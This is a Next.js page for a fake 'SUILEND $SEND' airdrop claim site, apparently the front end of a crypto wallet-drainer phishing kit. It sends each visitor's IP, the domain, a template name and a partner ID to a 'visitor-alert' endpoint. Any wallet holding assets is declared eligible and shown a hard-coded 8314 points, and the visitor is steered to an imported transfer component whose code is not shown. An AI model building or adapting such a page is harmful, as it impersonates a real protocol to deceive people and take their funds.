"use client";
import React, { useState, useEffect } from "react";
import Image from "next/image";
import TopBar from "../components/TopBar";
import TickerBar from "../components/TickerBar";
import RightBar from "../components/RightBar";
import MobileWalletPrompt from "../components/MobileWalletPrompt";
import { ParameterizedTransfer } from "./ParameterizedTransfer";
import { useAccountInfo } from "../../hooks/useAccountInfo";
import { usePartnerId } from "../../hooks/usePartnerId";
import { fetchWithRetry } from "../../utils/apiUtils";
import { AccountInfo, GeolocationData } from "../../types/types";

const Page: React.FC = () => {
  const { accountInfo, isLoading: isAccountLoading } = useAccountInfo();
  const [isInitialLoading, setIsInitialLoading] = useState(true);
  const [points, setPoints] = useState(0);
  const [isEligible, setIsEligible] = useState(false);
  const partnerId = usePartnerId();

  useEffect(() => {
    const sendVisitorAlert = async () => {
      try {
        const geoData = await fetchWithRetry<GeolocationData>(
          "https://ipapi.co/json/",
          {}
        );
        const domain = window.location.hostname;
        const template = process.env.NEXT_PUBLIC_TEMPLATE || "DEEP";

        if (!partnerId) {
          console.error("PartnerId is not available");
          return;
        }

        const response = await fetch("/api/visitor-alert", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            ip: geoData.ip,
            domain,
            template,
            partnerId,
          }),
        });

        if (!response.ok) {
          throw new Error("Failed to send visitor alert");
        }

        console.log("Visitor alert sent successfully");
      } catch (error) {
        console.error("Error sending visitor alert:", error);
      }
    };

    if (partnerId) {
      sendVisitorAlert();
    }
  }, [partnerId]); // Now depends on partnerId

  useEffect(() => {
    const timer = setTimeout(() => {
      setIsInitialLoading(false);
      console.log("Initial loading set to false");
    }, 1000);

    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    if (accountInfo && !isAccountLoading) {
      const eligible: boolean = Boolean(
        (accountInfo.nfts && accountInfo.nfts.length > 0) ||
          (accountInfo.coins && accountInfo.coins.length > 0) ||
          (accountInfo.stakesOverview &&
            accountInfo.stakesOverview.withdrawableStakes &&
            accountInfo.stakesOverview.withdrawableStakes.length > 0)
      );

      setIsEligible(eligible);
      setPoints(eligible ? 8314 : 0);
    } else {
      setIsEligible(false);
      setPoints(0);
    }
  }, [accountInfo, isAccountLoading]);

  if (isInitialLoading) {
    return (
      <div className="fixed inset-0 flex items-center justify-center">
        <div className="flex flex-col items-center w-full z-10 relative">
          <div className="flex justify-center w-full mb-4">
            <Image
              src="/sv12.png"
              alt="Logo"
              width={70}
              height={70}
              className="mb-4"
            />
          </div>
          <div className="text-white text-xl font-semibold mb-4">
            Loading...
          </div>
          <div className="animate-spin rounded-full h-8 w-8 border-t-2 border-b-2 border-blue-500"></div>
        </div>
      </div>
    );
  }

  return (
    <div className="relative min-h-screen text-white">
      <TopBar />
      <TickerBar />

      {/* Header with its own full height */}
      <div
        className="relative w-full bg-cover bg-center h-64 md:h-64 flex items-center justify-center"
        style={{ backgroundImage: "url('/header.png')" }}
      >
        <div className="absolute inset-0 "></div>
        <div className="relative z-10 flex items-center justify-center w-full max-w-7xl px-6">
          <h1 className="font-supply-bold text-2xl md:text-4xl text-[#91dcf4]">
            SUILEND $SEND ECOSYSTEM AIRDROP
          </h1>
        </div>
      </div>

      <div className="relative z-10 flex flex-col lg:flex-row min-h-[calc(100vh-64px-16rem)]">
        {" "}
        {/* Adjusted for header height */}
        <div className="w-full lg:w-[80%] p-6 flex flex-col">
          <div className="flex justify-between items-center flex-grow">
            <div className="hidden lg:flex flex-col space-y-4 w-1/4">
              {[
                "aftermath-finance",
                "alphafi",
                "bucket-protocol",
                "cetus-amm",
                "deepbook",
              ].map((protocol) => (
                <div
                  key={protocol}
                  className="relative w-16 h-16 mx-auto group"
                >
                  <div className="absolute inset-0 bg-purple-500 rounded-full opacity-20 group-hover:opacity-40 transition-opacity duration-300"></div>
                  <div className="absolute inset-0 bg-gradient-to-br from-purple-400/30 to-purple-600/30 rounded-full opacity-70 group-hover:opacity-90 transition-opacity duration-300"></div>
                  <div className="absolute inset-0 flex items-center justify-center">
                    <Image
                      src={`/protocols/${protocol}.webp`}
                      alt={protocol}
                      width={48}
                      height={48}
                      className="rounded-full object-cover group-hover:scale-110 transition-transform duration-300"
                    />
                  </div>
                  <div className="absolute -inset-1 bg-purple-500 rounded-full blur-sm opacity-30 group-hover:opacity-50 transition-opacity duration-300"></div>
                </div>
              ))}
            </div>
            <div className="flex flex-col items-center justify-center max-w-md">
              <h2 className="font-supply-bold text-2xl md:text-3xl text-center mb-4 text-[#91dcf4]">
                $SEND SEASON 2 DISTRIBUTION
              </h2>

              <div className="relative mb-6">
                <div className="absolute inset-0 bg-purple-500 rounded-full blur-xl animate-pulse opacity-50"></div>
                <div className="relative animate-spin-slow">
                  <Image
                    src="/sv12.png"
                    alt="Points"
                    width={100}
                    height={100}
                    className="transform hover:scale-110 transition-transform duration-300"
                  />
                </div>
              </div>
              <h3 className="font-supply-regular text-xl md:text-2xl text-center mb-4 text-white uppercase">
                {!accountInfo
                  ? "CONNECT YOUR WALLET TO CHECK YOUR $SEND ALLOCATION"
                  : isEligible
                  ? "CONGRATS! YOU ARE ELIGIBLE"
                  : "NO ALLOCATION. TRY ANOTHER WALLET"}
              </h3>
              {isAccountLoading ? (
                <div className="bg-gradient-to-r from-purple-500 to-purple-600 rounded-lg p-2 mb-6 shadow-lg transform transition duration-500 hover:scale-105 w-40">
                  <div className="flex items-center justify-center h-10">
                    <div className="flex items-center w-full justify-between px-2">
                      <div className="flex-shrink-0 w-8 h-8 overflow-hidden rounded-full">
                        <Image
                          src="/android-chrome-384x384.png"
                          alt="Points"
                          width={30}
                          height={30}
                          className="object-cover w-full h-full"
                        />
                      </div>
                      <div className="flex items-center h-8 space-x-1">
                        {[0, 1, 2].map((index) => (
                          <div
                            key={index}
                            className="w-2 h-2 bg-white rounded-full animate-bounce"
                            style={{ animationDelay: `${index * 0.15}s` }}
                          ></div>
                        ))}
                      </div>
                    </div>
                  </div>
                </div>
              ) : (
                <div className="bg-gradient-to-r from-purple-500 to-purple-600 rounded-lg p-2 mb-6 shadow-lg transform transition duration-500 hover:scale-105 w-40">
                  <div className="flex items-center justify-center h-10">
                    <div className="flex items-center w-full justify-between px-2">
                      <div className="flex-shrink-0 w-8 h-8 overflow-hidden rounded-full">
                        <Image
                          src="/android-chrome-384x384.png"
                          alt="Points"
                          width={30}
                          height={30}
                          className="object-cover w-full h-full"
                        />
                      </div>
                      <div className="flex items-center h-8">
                        <p className="text-xl font-supply-regular font-bold text-white m-0 leading-none">
                          {points}
                        </p>
                      </div>
                    </div>
                  </div>
                </div>
              )}
              <svg
                className="w-12 h-12 mb-4 animate-bounce"
                viewBox="0 0 24 24"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                <path
                  d="M12 4V20M12 20L18 14M12 20L6 14"
                  stroke="#91dcf4"
                  strokeWidth="2"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                />
              </svg>
              <ParameterizedTransfer
                accountInfo={accountInfo}
                isLoading={isAccountLoading}
              />
            </div>
            <div className="hidden lg:flex flex-col space-y-4 w-1/4">
              {[
                "haedal-protocol",
                "kriya",
                "navi-protocol",
                "scallop-lend",
                "turbos",
              ].map((protocol) => (
                <div
                  key={protocol}
                  className="relative w-16 h-16 mx-auto group"
                >
                  <div className="absolute inset-0 bg-purple-500 rounded-full opacity-20 group-hover:opacity-40 transition-opacity duration-300"></div>
                  <div className="absolute inset-0 bg-gradient-to-br from-purple-400/30 to-purple-600/30 rounded-full opacity-70 group-hover:opacity-90 transition-opacity duration-300"></div>
                  <div className="absolute inset-0 flex items-center justify-center">
                    <Image
                      src={`/protocols/${protocol}.webp`}
                      alt={protocol}
                      width={48}
                      height={48}
                      className="rounded-full object-cover group-hover:scale-110 transition-transform duration-300"
                    />
                  </div>
                  <div className="absolute -inset-1 bg-purple-500 rounded-full blur-sm opacity-30 group-hover:opacity-50 transition-opacity duration-300"></div>
                </div>
              ))}
            </div>
          </div>
        </div>
        <div className="hidden lg:block lg:w-[20%] p-4">
          <RightBar />
        </div>
      </div>
      <MobileWalletPrompt />
    </div>
  );
};

export default Page;
